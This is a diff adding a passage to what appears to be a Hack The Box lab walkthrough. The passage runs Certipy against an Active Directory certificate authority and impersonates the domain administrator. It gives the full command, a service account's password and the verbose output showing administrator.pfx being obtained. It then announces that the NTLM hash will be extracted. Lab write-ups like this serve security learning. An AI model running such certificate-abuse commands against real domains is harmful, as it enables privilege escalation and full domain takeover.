@@ -1254,6 +1254,34 @@ Now that is enabled
 Now its all setup 
 
 ```python
+certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ0d' -target dc01.fries.htb -dc-ip 10.129.244.72 -dc-host dc01.fries.htb -target-ip 10.129.244.72 -ca 'fries-DC01-CA' -template 'User' -upn 'administrator@fries.htb' -sid 'S-1-5-21-858338346-3861030516-3975240472-500' -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.129.244.72'
+[+] DC IP: '10.129.244.72'
+[+] DC Host: 'dc01.fries.htb'
+[+] Target IP: '10.129.244.72'
+[+] Remote Name: 'dc01.fries.htb'
+[+] Domain: 'FRIES.HTB'
+[+] Username: 'SVC_INFRA'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.244.72[\pipe\cert]
+[*] Request ID is 47
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@fries.htb'
+[+] Found SID in SAN URL: 'S-1-5-21-858338346-3861030516-3975240472-500'
+[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+Now ill use thiis certificate to extract the NTLM
+
+```python
 
 ```
 
